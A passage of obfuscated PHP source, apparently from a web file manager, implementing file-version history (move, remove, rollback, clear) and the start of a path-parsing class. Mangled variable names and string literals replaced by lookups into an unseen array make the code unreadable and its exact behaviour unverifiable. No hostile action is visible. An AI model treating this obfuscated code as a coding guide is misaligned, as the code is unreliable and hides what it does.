$ê£‹¹Ö½[$ƒìˆ ôş[368]]) { self::moveHistory($÷Ëèß…Í, $ÀÀ¢«ê[1]); } } else { IO::rename($—İó’’[$ƒìˆ ôş[78]], $ÀÀ¢«ê[1]); } } public static function eventBeforeMove($º®î¨€) { $äÁ§‘§ =& $_SERVER[Ôó‡è­ƒ]; $Å¡İËÉÇ = self::parsePath($º®î¨€[0]); if (!$Å¡İËÉÇ) { return; } $û£€…ƒ = self::parsePath($º®î¨€[1]); if (!$û£€…ƒ) { return; } $ƒëÀÌäÂ = $º®î¨€[3]; $ñŞæÏ½Ü = self::checkInHistory($Å¡İËÉÇ); if (!$ñŞæÏ½Ü) { return; } $—öí×š¥ = self::pathHistory($û£€…ƒ); if ($ñŞæÏ½Ü[$äÁ§‘§[33]] == $äÁ§‘§[196]) { $ô³á”ş† = self::listData($Å¡İËÉÇ); $¶šÄÜ† = rtrim($û£€…ƒ, $äÁ§‘§[8]) . $äÁ§‘§[8] . ($ƒëÀÌäÂ ? $ƒëÀÌäÂ : get_path_this($Å¡İËÉÇ)); $¹üé´Ìê = self::listData($¶šÄÜ†); if ($ô³á”ş† && $ô³á”ş†[$äÁ§‘§[368]] && $¹üé´Ìê && $¹üé´Ìê[$äÁ§‘§[368]]) { return self::clear($Å¡İËÉÇ); } if ($ô³á”ş† && $ô³á”ş†[$äÁ§‘§[368]]) { self::moveHistory($Å¡İËÉÇ, $ƒëÀÌäÂ, $—öí×š¥); } } else { IO::move($ñŞæÏ½Ü[$äÁ§‘§[78]], $—öí×š¥, !1, $ƒëÀÌäÂ); self::clearEmptyFolder(IO::pathFather($ñŞæÏ½Ü[$äÁ§‘§[78]])); } } public static function eventAfterRemove($†ÚªÎÔ, $¥–Å»€) { $Óšã”ê =& $_SERVER[Ôó‡è­ƒ]; if (!$¥–Å»€) { return; } $üã™Ê—’ = self::parsePath($†ÚªÎÔ[0]); if (!$üã™Ê—’) { return; } $·°¸ñŠ¦ = self::checkInHistory($üã™Ê—’); if (!$·°¸ñŠ¦) { return; } if ($·°¸ñŠ¦[$Óšã”ê[33]] == $Óšã”ê[196]) { $ØÕÙÔŠä = self::listData($üã™Ê—’, !1); if ($ØÕÙÔŠä && $ØÕÙÔŠä[$Óšã”ê[368]]) { self::clear($üã™Ê—’, !1); } } else { IO::remove($·°¸ñŠ¦[$Óšã”ê[78]]); self::clearEmptyFolder(IO::pathFather($·°¸ñŠ¦[$Óšã”ê[78]])); } } private static function checkInHistory($™›¤›’ä) { $°¾Æèé = self::pathHistory($™›¤›’ä); if (!IO::exist($°¾Æèé)) { $°¾Æèé .= $_SERVER[Ôó‡è­ƒ][1221]; } return IO::exist($°¾Æèé) ? IO::info($°¾Æèé) : !1; } private static function parsePath($àâõâ¤) { $‡•Ãı¸é =& $_SERVER[Ôó‡è­ƒ]; if (!$àâõâ¤) { return !1; } if ($GLOBALS[$‡•Ãı¸é[1222]]) { return; } $„€õ˜˜„ = KodIO::parse($àâõâ¤); $ò²¾­ø = $„€õ˜˜„[$‡•Ãı¸é[33]]; $…ú‹ú€µ = !$ò²¾­ø || $ò²¾­ø == KodIO::KOD_IO || $ò²¾­ø == KodIO::KOD_SHARE_ITEM; if (!$…ú‹ú€µ || !$„€õ˜˜„[$‡•Ãı¸é[1223]]) { return !1; } if (substr($àâõâ¤, 0, strlen(DATA_PATH . $‡•Ãı¸é[1224])) == DATA_PATH . $‡•Ãı¸é[1224]) { return !1; } if ($ò²¾­ø == KodIO::KOD_SHARE_ITEM) { $Å¯Å‹ = IO::init($àâõâ¤); if ($Å¯Å‹->pathParse[$‡•Ãı¸é[1151]]) { return self::parsePath($Å¯Å‹->pathParse[$‡•Ãı¸é[1151]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $÷Ğ€’¼î = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $‡•Ãı¸é[1225]); foreach ($÷Ğ€’¼î as $µ’ÀÔ©Ö) { if (!$ò²¾­ø && substr($àâõâ¤, 0, strlen($µ’ÀÔ©Ö)) == $µ’ÀÔ©Ö) { return !1; } } self::log($GLOBALS[$‡•Ãı¸é[1146]] . $‡•Ãı¸é[1226] . $àâõâ¤); return $àâõâ¤; } private static function pathHistory($Ì¹£Ó¤¶) { $†×·§‹› =& $_SERVER[Ôó‡è­ƒ]; $ñöÛ¬¬° = self::$_historyBase . ltrim(KodIO::clear($Ì¹£Ó¤¶), $†×·§‹›[8]); $ñöÛ¬¬° = str_replace(array($†×·§‹›[1227]), array($†×·§‹›[1228]), $ñöÛ¬¬°); return $ñöÛ¬¬°; } public static function log($ÏúŸ² ›) { } public static function historyCount($á°ãŒ¦) { $¯øÑÉŞŠ =& $_SERVER[Ôó‡è­ƒ]; $òş‘·Óå = array(); $©Ä¡¼‚æ = array(); foreach ($á°ãŒ¦ as $‡­œÀıÉ) { $±Ñ­…²å = get_path_father($‡­œÀıÉ); if (!$©Ä¡¼‚æ[$±Ñ­…²å]) { $©Ä¡¼‚æ[$±Ñ­…²å] = array(); } $©Ä¡¼‚æ[$±Ñ­…²å][] = get_path_this($‡­œÀıÉ); } foreach ($©Ä¡¼‚æ as $±Ñ­…²å => $ƒëùˆšÎ) { $¸‡İ–€¹ = self::parsePath($±Ñ­…²å); if (!$¸‡İ–€¹) { continue; } foreach ($ƒëùˆšÎ as $¨åÜ Œç) { $×œƒ—åÁ = self::listData(rtrim($¸‡İ–€¹, $¯øÑÉŞŠ[8]) . $¯øÑÉŞŠ[8] . $¨åÜ Œç, !1); if ($×œƒ—åÁ && $×œƒ—åÁ[$¯øÑÉŞŠ[368]]) { $òş‘·Óå[rtrim($±Ñ­…²å, $¯øÑÉŞŠ[8]) . $¯øÑÉŞŠ[8] . $¨åÜ Œç] = count($×œƒ—åÁ[$¯øÑÉŞŠ[368]]); } } } return $òş‘·Óå; } public static function add($š‚¼Ûìê) { $ÙÂ½²ş¤ =& $_SERVER[Ôó‡è­ƒ]; $ö©ïÉñ¦ = self::listData($š‚¼Ûìê); if (!$ö©ïÉñ¦) { return; } $òÚĞŸìÍ = Model($ÙÂ½²ş¤[768])->get($ÙÂ½²ş¤[1229]); $˜Ë†Š’£ = $GLOBALS[$ÙÂ½²ş¤[6]][$ÙÂ½²ş¤[90]][$ÙÂ½²ş¤[1207]]; $¢úÈ´¸ï = $òÚĞŸìÍ == $ÙÂ½²ş¤[1230] ? 5 : $˜Ë†Š’£; if ($˜Ë†Š’£ <= 0) { return; } $Ö®‹ı‹³ = IO::hashSimple($š‚¼Ûìê); $Šó¼¢„ş = IO::info($š‚¼Ûìê); $û×Ğ–Ë³ = $ö©ïÉñ¦[$ÙÂ½²ş¤[368]]; if ($Šó¼¢„ş[$ÙÂ½²ş¤[80]] == 0) { return; } if ($Šó¼¢„ş[$ÙÂ½²ş¤[80]] >= 1024 * 1024 * 500) { return !1; } if ($û×Ğ–Ë³ && $û×Ğ–Ë³[0][$ÙÂ½²ş¤[174]] == $Ö®‹ı‹³) { return !0; } if (array_key_exists($ÙÂ½²ş¤[199], $Šó¼¢„ş) && !$Šó¼¢„ş[$ÙÂ½²ş¤[199]]) { return !1; } $ ¼´×‚˜ = short_id(time()); $ê›ÛÈ¸õ = array($ÙÂ½²ş¤[396] => $ ¼´×‚˜, $ÙÂ½²ş¤[174] => $Ö®‹ı‹³, $ÙÂ½²ş¤[32] => $Šó¼¢„ş[$ÙÂ½²ş¤[32]] . $ÙÂ½²ş¤[10] . date($ÙÂ½²ş¤[1231]) . rand_string(1), $ÙÂ½²ş¤[80] => $Šó¼¢„ş[$ÙÂ½²ş¤[80]], $ÙÂ½²ş¤[448] => USER_ID, $ÙÂ½²ş¤[197] => time(), $ÙÂ½²ş¤[1232] => $ÙÂ½²ş¤[12]); IO::mkdir($ö©ïÉñ¦[$ÙÂ½²ş¤[1233]]); $šŸ¥Íı = IO::copy($š‚¼Ûìê, $ö©ïÉñ¦[$ÙÂ½²ş¤[1233]], !1, $ê›ÛÈ¸õ[$ÙÂ½²ş¤[32]]); if (!$šŸ¥Íı) { self::clearEmptyFolder($ö©ïÉñ¦[$ÙÂ½²ş¤[1233]]); return !1; } array_unshift($û×Ğ–Ë³, $ê›ÛÈ¸õ); if (count($û×Ğ–Ë³) > $¢úÈ´¸ï) { $ëç¡Ô…· = array_slice($û×Ğ–Ë³, $¢úÈ´¸ï); foreach ($ëç¡Ô…· as $œ“¼—‘) { IO::remove($ö©ïÉñ¦[$ÙÂ½²ş¤[1233]] . $œ“¼—‘[$ÙÂ½²ş¤[32]]); } $û×Ğ–Ë³ = array_slice($û×Ğ–Ë³, 0, $¢úÈ´¸ï); } return self::saveData($ö©ïÉñ¦[$ÙÂ½²ş¤[1234]], $û×Ğ–Ë³); } public static function remove($òå™ñ«, $Ï®˜·•›) { $Êâø–‰ =& $_SERVER[Ôó‡è­ƒ]; $•„¥Ù = self::listData($òå™ñ«); $Í¿ı¿¿ä = array(); if (!$•„¥Ù) { return !1; } foreach ($•„¥Ù[$Êâø–‰[368]] as $ÔáÆæ‰ç) { if ($ÔáÆæ‰ç[$Êâø–‰[396]] == $Ï®˜·•›) { IO::remove($•„¥Ù[$Êâø–‰[1233]] . $ÔáÆæ‰ç[$Êâø–‰[32]]); continue; } $Í¿ı¿¿ä[] = $ÔáÆæ‰ç; } return self::saveData($•„¥Ù[$Êâø–‰[1234]], $Í¿ı¿¿ä); } public static function clear($§êÁ–ĞÃ, $óÜÌÍ© = true) { $ÀÂÄåÒ =& $_SERVER[Ôó‡è­ƒ]; $ëá‰÷Ô = self::listData($§êÁ–ĞÃ, $óÜÌÍ©); if (!$ëá‰÷Ô) { return !1; } foreach ($ëá‰÷Ô[$ÀÂÄåÒ[368]] as $¨ÛÇë) { IO::remove($ëá‰÷Ô[$ÀÂÄåÒ[1233]] . $¨ÛÇë[$ÀÂÄåÒ[32]]); } return self::saveData($ëá‰÷Ô[$ÀÂÄåÒ[1234]], array()); } public static function moveHistory($é¨ùâˆä, $Èíé™×Ó = '', $ÂÊ¡Ÿ¥’ = '') { $ŠÓËÓ‹ =& $_SERVER[Ôó‡è­ƒ]; $Ê»’ïâ = self::listData($é¨ùâˆä, !1); if (!$Ê»’ïâ || !$Ê»’ïâ[$ŠÓËÓ‹[368]]) { return !1; } $¶€ŒÇæé = $ŠÓËÓ‹[1221]; $Èíé™×Ó = $Èíé™×Ó ? $Èíé™×Ó : get_path_this($é¨ùâˆä); $ÂÊ¡Ÿ¥’ = $ÂÊ¡Ÿ¥’ ? $ÂÊ¡Ÿ¥’ : $Ê»’ïâ[$ŠÓËÓ‹[1233]]; $ŠĞÉŒ€ = substr(get_path_this($Ê»’ïâ[$ŠÓËÓ‹[1234]]), 0, -strlen($¶€ŒÇæé)); foreach ($Ê»’ïâ[$ŠÓËÓ‹[368]] as $İØ½¤¥¹ => $è‹šˆ²—) { $˜ÑÚ”¼µ = $Èíé™×Ó . substr($è‹šˆ²—[$ŠÓËÓ‹[32]], strlen($ŠĞÉŒ€)); $şÃ²Ìş¶ = IO::move($Ê»’ïâ[$ŠÓËÓ‹[1233]] . $è‹šˆ²—[$ŠÓËÓ‹[32]], $ÂÊ¡Ÿ¥’, !1, $˜ÑÚ”¼µ); if ($şÃ²Ìş¶) { $Ê»’ïâ[$ŠÓËÓ‹[368]][$İØ½¤¥¹][$ŠÓËÓ‹[32]] = $˜ÑÚ”¼µ; } } $Ê»’ïâ[$ŠÓËÓ‹[1234]] = IO::move($Ê»’ïâ[$ŠÓËÓ‹[1234]], $ÂÊ¡Ÿ¥’, !1, $Èíé™×Ó . $¶€ŒÇæé); self::saveData($Ê»’ïâ[$ŠÓËÓ‹[1234]], $Ê»’ïâ[$ŠÓËÓ‹[368]]); self::clearEmptyFolder($Ê»’ïâ[$ŠÓËÓ‹[1233]]); } public static function rollback($¢‹¢¤æ¨, $ŒšÑÒÚØ) { $Ê‚”ã™€ =& $_SERVER[Ôó‡è­ƒ]; $›ƒ¢ê¶ = self::listData($¢‹¢¤æ¨); if (!$›ƒ¢ê¶) { return; } $™ı¹½Ç = IO::info($¢‹¢¤æ¨); foreach ($›ƒ¢ê¶[$Ê‚”ã™€[368]] as $ÓØûËÒ => $õä›µÛå) { if ($õä›µÛå[$Ê‚”ã™€[396]] == $ŒšÑÒÚØ) { self::add($¢‹¢¤æ¨); $¬€ïÏ¼œ = $›ƒ¢ê¶[$Ê‚”ã™€[1233]] . $õä›µÛå[$Ê‚”ã™€[32]]; $å™ë¼ú = IO::copy($¬€ïÏ¼œ, IO::pathFather($¢‹¢¤æ¨), REPEAT_REPLACE, $™ı¹½Ç[$Ê‚”ã™€[32]]); if ($å™ë¼ú) { self::remove($¢‹¢¤æ¨, $ŒšÑÒÚØ); } return $å™ë¼ú; } } return !1; } public static function setDetail($œ®Å÷µÖ, $çªïàË©, $ß©‰ş·) { $ì‡÷Æ´ =& $_SERVER[Ôó‡è­ƒ]; $²Î¹óÀÃ = self::listData($œ®Å÷µÖ); if (!$²Î¹óÀÃ) { return; } foreach ($²Î¹óÀÃ[$ì‡÷Æ´[368]] as $İÍÆÉ÷¢ => $®˜Í˜†ø) { if ($®˜Í˜†ø[$ì‡÷Æ´[396]] == $çªïàË©) { $²Î¹óÀÃ[$ì‡÷Æ´[368]][$İÍÆÉ÷¢][$ì‡÷Æ´[1232]] = $ß©‰ş·; self::saveData($²Î¹óÀÃ[$ì‡÷Æ´[1234]], $²Î¹óÀÃ[$ì‡÷Æ´[368]]); return !0; } } return !1; } public static function fileInfo($³±©Ô½’, $ éœÒ™é) { $ª¿„¡î =& $_SERVER[Ôó‡è­ƒ]; $¯¹ú’èˆ = self::listData($³±©Ô½’); if (!$¯¹ú’èˆ) { show_json(LNG($ª¿„¡î[106]), !1); } $„°²Ğæç = $ª¿„¡î[12]; foreach ($¯¹ú’èˆ[$ª¿„¡î[368]] as $üğğ«´ => $‹İã“ô¯) { if ($‹İã“ô¯[$ª¿„¡î[396]] != $ éœÒ™é) { continue; } $„°²Ğæç = $¯¹ú’èˆ[$ª¿„¡î[1233]] . $‹İã“ô¯[$ª¿„¡î[32]]; break; } if (!$„°²Ğæç) { show_json(LNG($ª¿„¡î[106]), !1); } return IO::info($„°²Ğæç); } public static function fileOut($æãî®–±, $ã×¯İù, $“‡‚ôŞ = false) { $Ã¦ÌáõÉ =& $_SERVER[Ôó‡è­ƒ]; $Ğí£é¾è = self::fileInfo($æãî®–±, $ã×¯İù); $Í£‡·ş¨ =& $GLOBALS[$Ã¦ÌáõÉ[7]]; $“‡‚ôŞ = isset($Í£‡·ş¨[$Ã¦ÌáõÉ[1197]]) && $Í£‡·ş¨[$Ã¦ÌáõÉ[1197]] == 1; if (isset($Í£‡·ş¨[$Ã¦ÌáõÉ[33]]) && $Í£‡·ş¨[$Ã¦ÌáõÉ[33]] == $Ã¦ÌáõÉ[1235]) { return IO::fileOutImage($Ğí£é¾è[$Ã¦ÌáõÉ[78]], $Í£‡·ş¨[$Ã¦ÌáõÉ[1236]]); } IO::fileOut($Ğí£é¾è[$Ã¦ÌáõÉ[78]], $“‡‚ôŞ, get_path_this($æãî®–±)); } public static function listData($…¾¥†Ë, $ò®Ó­¯ = true) { $åõ×†›¬ =& $_SERVER[Ôó‡è­ƒ]; if ($ò®Ó­¯ && !IO::exist($…¾¥†Ë)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($…¾¥†Ë, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ã”¤Ëä = self::pathHistory($…¾¥†Ë); $¥½şùŒË = array($åõ×†›¬[1234] => $ã”¤Ëä . $åõ×†›¬[1221], $åõ×†›¬[1233] => rtrim(get_path_father($ã”¤Ëä), $åõ×†›¬[8]) . $åõ×†›¬[8], $åõ×†›¬[368] => array()); $Ëá‘ØÖ¦ = IO::getContent($¥½şùŒË[$åõ×†›¬[1234]]); if ($Ëá‘ØÖ¦) { $İ¯€½Éô = json_decode($Ëá‘ØÖ¦, !0); if (is_array($İ¯€½Éô)) { $¥½şùŒË[$åõ×†›¬[368]] = $İ¯€½Éô; } } return $¥½şùŒË; } private static function saveData($ç„´¼şÍ, $ì°çŸ¿±) { $ì¯Ê—Œ± =& $_SERVER[Ôó‡è­ƒ]; self::log($ì¯Ê—Œ±[1237] . $ç„´¼şÍ . $ì¯Ê—Œ±[71] . count($ì°çŸ¿±), $ì¯Ê—Œ±[750]); if ($ì°çŸ¿±) { return IO::setContent($ç„´¼şÍ, json_encode($ì°çŸ¿±)); } $ôÎ¬¸Ö = IO::pathFather($ç„´¼şÍ); IO::remove($ç„´¼şÍ); self::clearEmptyFolder($ôÎ¬¸Ö); return !0; } public static function clearEmptyFolder($…’•Å„) { $âîû‡Ïº =& $_SERVER[Ôó‡è­ƒ]; if (trim($…’•Å„, $âîû‡Ïº[8]) == trim(self::$_historyBase, $âîû‡Ïº[8])) { return; } $Ÿ¸œ’Ç  = IO::pathFather($…’•Å„); $ Æè·ÎÆ = IO::has($…’•Å„, !0); if ($ Æè·ÎÆ[$âîû‡Ïº[206]] > 0 || $ Æè·ÎÆ[$âîû‡Ïº[207]] > 0) { return; } IO::remove($…’•Å„); self::clearEmptyFolder($Ÿ¸œ’Ç ); } private static function getBasePath() { $Ş§…Î‰ƒ =& $_SERVER[Ôó‡è­ƒ]; $Ô…¿íı— = Model($Ş§…Î‰ƒ[1238])->get($Ş§…Î‰ƒ[1239]); if ($Ô…¿íı—) { if (!IO::exist($Ô…¿íı—)) { IO::mkdir($Ô…¿íı—); } if (get_path_this($Ô…¿íı—) == $Ş§…Î‰ƒ[1224]) { $–İ¾ı = $Ş§…Î‰ƒ[1240] . rand_string(8); @rename($Ô…¿íı—, get_path_father($Ô…¿íı—) . $Ş§…Î‰ƒ[8] . $–İ¾ı); $Ô…¿íı— = DATA_PATH . $–İ¾ı . $Ş§…Î‰ƒ[8]; file_put_contents(DATA_PATH . $Ş§…Î‰ƒ[1241], $Ş§…Î‰ƒ[12]); Model($Ş§…Î‰ƒ[1238])->set($Ş§…Î‰ƒ[1239], $Ô…¿íı—); } return $Ô…¿íı—; } $Ô…¿íı— = DATA_PATH . $Ş§…Î‰ƒ[1240] . rand_string(8) . $Ş§…Î‰ƒ[8]; $Ô…¿íı— = IO::mkdir($Ô…¿íı—); $Ô…¿íı— = rtrim($Ô…¿íı—, $Ş§…Î‰ƒ[8]) . $Ş§…Î‰ƒ[8]; file_put_contents($Ô…¿íı— . $Ş§…Î‰ƒ[1241], $Ş§…Î‰ƒ[12]); file_put_contents(DATA_PATH . $Ş§…Î‰ƒ[1241], $Ş§…Î‰ƒ[12]); Model($Ş§…Î‰ƒ[1238])->set($Ş§…Î‰ƒ[1239], $Ô…¿íı—); return $Ô…¿íı—; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\x72\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\x72\122\x65\143\x79\143\x6c\x65\175"; const KOD_USER_FAV = "\173\x75\x73\x65\162\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\x65\162\x46\151\x6c\145\x54\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\x72\106\x69\154\x65\124\x79\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\x75\160\122\157\157\x74\x53\145\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\163\x65\162\123\150\x61\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\162\123\x68\x61\162\x65\114\151\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\x65\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\162\x65\111\164\145\155\x7d"; const KOD_SHARE_LINK = "\173\x73\x68\x61\162\x65\x49\164\145\155\114\x69\x6e\x6b\175"; const KOD_SEARCH = "\x7b\163\x65\x61\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\x62\154\x6f\x63\153\x7d"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\173\x75\163\145\162\122\x65\x6e\143\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\x65\162\x7d"; public static function typeList() { $ğ¯µ¦°• =& $_SERVER[Ôó‡è­ƒ]; return array($ğ¯µ¦°•[1242] => self::KOD_SOURCE, $ğ¯µ¦°•[1243] => self::KOD_USER_RECYCLE, $ğ¯µ¦°•[1244] => self::KOD_USER_FAV, $ğ¯µ¦°•[1245] => self::KOD_USER_FILE_TAG, $ğ¯µ¦°•[1246] => self::KOD_USER_FILE_TYPE, $ğ¯µ¦°•[1247] => self::KOD_GROUP_ROOT_SELF, $ğ¯µ¦°•[1248] => self::KOD_USER_SHARE, $ğ¯µ¦°•[1249] => self::KOD_USER_SHARE_LINK, $ğ¯µ¦°•[1250] => self::KOD_USER_SHARE_TO_ME, $ğ¯µ¦°•[1251] => self::KOD_SHARE_ITEM, $ğ¯µ¦°•[1252] => self::KOD_SHARE_LINK, $ğ¯µ¦°•[1253] => self::KOD_SEARCH, $ğ¯µ¦°•[1254] => self::KOD_BLOCK, $ğ¯µ¦°•[1255] => self::KOD_IO, $ğ¯µ¦°•[1256] => self::KOD_USER_RECENT, $ğ¯µ¦°•[1257] => self::KOD_USER_DRIVER); } public static function parse($Ğé¶Ôáí) { $Ï¬’Ú£€ =& $_SERVER[Ôó‡è­ƒ]; $Ğé¶Ôáí = self::clear($Ğé¶Ôáí); $õ×²ŸÌ = array_values(self::typeList()); preg_match($Ï¬’Ú£€[1258], $Ğé¶Ôáí, $Ï¦¤šâ); $¯Û¢ï¯Œ = array($Ï¬’Ú£€[419] => !1, $Ï¬’Ú£€[1259] => !1, $Ï¬’Ú£€[416] => !1, $Ï¬’Ú£€[78] => $Ğé¶Ôáí, $Ï¬’Ú£€[1168] => !1, $Ï¬’Ú£€[1167] => $Ï¬’Ú£€[12]); if (is_array($Ï¦¤šâ) && count($Ï¦¤šâ) == 5) { $¸äÄšÙ = $Ï¬’Ú£€[1260] . $Ï¦¤šâ[2] . $Ï¬’Ú£€[326]; if (in_array($¸äÄšÙ, $õ×²ŸÌ)) { $¯Û¢ï¯Œ[$Ï¬’Ú£€[1168]] = $Ï¦¤šâ[1]; $¯Û¢ï¯Œ[$Ï¬’Ú£€[33]] = $¸äÄšÙ; $¯Û¢ï¯Œ[$Ï¬’Ú£€[1261]] = substr($¸äÄšÙ, 1, -1); $¯Û¢ï¯Œ[$Ï¬’Ú£€[396]] = $Ï¦¤šâ[3]; } $¯Û¢ï¯Œ[$Ï¬’Ú£€[1167]] = $Ï¦¤šâ[4]; } $‘ø°Ç• = array($Ï¬’Ú£€[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $¯Û¢ï¯Œ[$Ï¬’Ú£€[1223]] = in_array($¯Û¢ï¯Œ[$Ï¬’Ú£€[33]], $‘ø°Ç•); return $¯Û¢ï¯Œ; } public static function isTruePath($Õ™²æ ·) { $ú¦šĞ†É =& $_SERVER[Ôó‡è­ƒ]; if (substr($Õ™²æ ·, 0, 1) != $ú¦šĞ†É[1260]) { return !0; } if (strpos($Õ™²æ ·, $ú¦šĞ†É[405]) === 0) { return !0; } if (strpos($Õ™²æ ·, $ú¦šĞ†É[1227]) === 0) { return !0; } if (strpos($Õ™²æ ·, $ú¦šĞ†É[1262]) === 0) { return !0; } if (strpos($Õ™²æ ·, $ú¦šĞ†É[1263]) === 0) { return !0; } if (strpos($Õ™²æ ·, $ú¦šĞ†É[1264]) === 0) { return !0; } return !1; } public static function clear($€æú²ä) { $Ä¯ÚµÓ„ =& $_SERVER[Ôó‡è­ƒ]; $€æú²ä = str_replace(array($Ä¯ÚµÓ„[1078], $Ä¯ÚµÓ„[230]), $Ä¯ÚµÓ„[53], $€æú²ä); $€æú²ä = str_replace($Ä¯ÚµÓ„[98], $Ä¯ÚµÓ„[8], $€æú²ä); $›’ïË¯ = $Ä¯ÚµÓ„[1265]; if (substr($€æú²ä, 0, 3) == $Ä¯ÚµÓ„[1266]) { $€æú²ä = substr($€æú²ä, 3); } while (strstr($€æú²ä, $›’ïË¯)) { $€æú²ä = str_replace($›’ïË¯, $Ä¯ÚµÓ„[8], $€æú²ä); } $€æú²ä = preg_replace($Ä¯ÚµÓ„[1267], $Ä¯ÚµÓ„[8], $€æú²ä); if ($€æú²ä == $Ä¯ÚµÓ„[8]) { return $Ä¯ÚµÓ„[8]; } $€æú²ä = rtrim($€æú²ä, $Ä¯ÚµÓ„[8]); return $€æú²ä; } public static function sourceID($¹ç®†ô¶) { $íüœşÓ’ =& $_SERVER[Ôó‡è­ƒ]; $üŸ¤“í• = self::parse($¹ç®†ô¶); if ($üŸ¤“í•[$íüœşÓ’[33]] !== self::KOD_SOURCE) { show_json(LNG($íüœşÓ’[1268]), !1); } return $üŸ¤“í•[$íüœşÓ’[396]]; } public static function make($ÂŠ‡ğÇ) { if (!$ÂŠ‡ğÇ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÂŠ‡ğÇ)); } public static function makeShare($ù€©Æ¢Ê, $øïÅ±ä·) { return self::makePath(self::KOD_SHARE_ITEM, $ù€©Æ¢Ê, $øïÅ±ä·); } public static function makeFileTypePath($«ĞÑĞšı) { return self::makePath(self::KOD_USER_FILE_TYPE, $«ĞÑĞšı); } public static function makeFileTagPath($İ¶Şğı«) { return self::makePath(self::KOD_USER_FILE_TAG, $İ¶Şğı«); } public static function makePath($‚î¹õŞ, $ùùĞÔ = '', $Ú®Ó•û¢ = '') { $ìµÛüÓÊ =& $_SERVER[Ôó‡è­ƒ]; $Ä“ƒƒ¼ = substr($‚î¹õŞ, 1, -1); $–­Ù¢şÅ = $ìµÛüÓÊ[1269] . $Ä“ƒƒ¼ . $ìµÛüÓÊ[1270] . $ùùĞÔ . $ìµÛüÓÊ[1271]; $–­Ù¢şÅ = $Ú®Ó•û¢ ? $–­Ù¢şÅ . $Ú®Ó•û¢ . $ìµÛüÓÊ[8] : $–­Ù¢şÅ; return $–­Ù¢şÅ; } public static function hashPath($°ÄáüáÑ, $ñ©ó¨üŞ = true) { $®æ…£§ =& $_SERVER[Ôó‡è­ƒ]; $×÷ù€¡Á = is_array($°ÄáüáÑ) ? $°ÄáüáÑ : IO::info($°ÄáüáÑ); $ßİéĞÎÙ = _get($×÷ù€¡Á, $®æ…£§[1272], $®æ…£§[12]); if (!$ßİéĞÎÙ && isset($×÷ù€¡Á[$®æ…£§[399]])) { $×÷ù€¡Á = IO::info(KodIO::make($×÷ù€¡Á[$®æ…£§[399]])); $ßİéĞÎÙ = _get($×÷ù€¡Á, $®æ…£§[1272], $®æ…£§[12]); } if (!$ßİéĞÎÙ && $ñ©ó¨üŞ) { $ÚÎşÖâõ = KodIO::parse($×÷ù€¡Á[$®æ…£§[78]]); if (!$ÚÎşÖâõ[$®æ…£§[33]]) { $ßİéĞÎÙ = IO::hashSimple($×÷ù€¡Á[$®æ…£§[78]]); } } if (!$ßİéĞÎÙ) { $ßİéĞÎÙ = md5($×÷ù€¡Á[$®æ…£§[78]] . $×÷ù€¡Á[$®æ…£§[80]] . $×÷ù€¡Á[$®æ…£§[86]]); } return $ßİéĞÎÙ; } public static function initSystemPath() { $¹Ïˆ¶ïÃ =& $_SERVER[Ôó‡è­ƒ]; if (defined($¹Ïˆ¶ïÃ[1273])) { return; } define($¹Ïˆ¶ïÃ[1273], self::systemPath($¹Ïˆ¶ïÃ[1274])); define($¹Ïˆ¶ïÃ[1275], self::systemPath($¹Ïˆ¶ïÃ[1276])); define($¹Ïˆ¶ïÃ[1277], self::systemPath($¹Ïˆ¶ïÃ[1278])); define($¹Ïˆ¶ïÃ[1279], self::systemPath($¹Ïˆ¶ïÃ[1280])); IOHistory::bindEvent(); } public static function systemPath($­İ“áò) { $÷ÆÃäĞ =& $_SERVER[Ôó‡è­ƒ]; $‰¦¬Ìø = $÷ÆÃäĞ[1281] . ucfirst($­İ“áò); $ŠÒ±ó’† = Model($÷ÆÃäĞ[768])->get($‰¦¬Ìø); if ($ŠÒ±ó’†) { return $ŠÒ±ó’†; } if ($­İ“áò == $÷ÆÃäĞ[1274]) { $ŠÒ±ó’† = self::make(Model($÷ÆÃäĞ[823])->systemRootPathAdd($÷ÆÃäĞ[536])); } else { $ŠÒ±ó’† = self::systemPath($÷ÆÃäĞ[1274]); $Ê¤ÓÎ¹Ÿ = self::sourceID($ŠÒ±ó’†); $ŠÒ±ó’† = self::make(Model($÷ÆÃäĞ[823])->mkdir($Ê¤ÓÎ¹Ÿ, $­İ“áò)); } Model($÷ÆÃäĞ[768])->set($‰¦¬Ìø, $ŠÒ±ó’†); return $ŠÒ±ó’†; } public static function systemFolder($æÈ«ä›ü) { $ûé¦“ì½ = IO_PATH_SYSTEM_SOURCE . $æÈ«ä›ü; $İÆöÌœ = Cache::get($ûé¦“ì½); if (!$İÆöÌœ) { $…½Ëùûì = IO::infoFull($ûé¦“ì½); if (!$…½Ëùûì) { $İÆöÌœ = IO::mkdir($ûé¦“ì½, REPEAT_SKIP); } else { $İÆöÌœ = $…½Ëùûì[$_SERVER[Ôó‡è­ƒ][78]]; } Cache::set($ûé¦“ì½, $İÆöÌœ, 3600 * 10); } return $İÆöÌœ; } public static function defaultDriver() { return Model($_SERVER[Ôó‡è­ƒ][765])->defaultDriver(); } public static function defaultIO() { $º”™ƒËØ =& $_SERVER[Ôó‡è­ƒ]; $›“›†£Å = self::defaultDriver(); return $º”™ƒËØ[1282] . $›“›†£Å[$º”™ƒËØ[396]] . $º”™ƒËØ[1271]; } public static function defaultDriverInit() { static $§áê’€Å 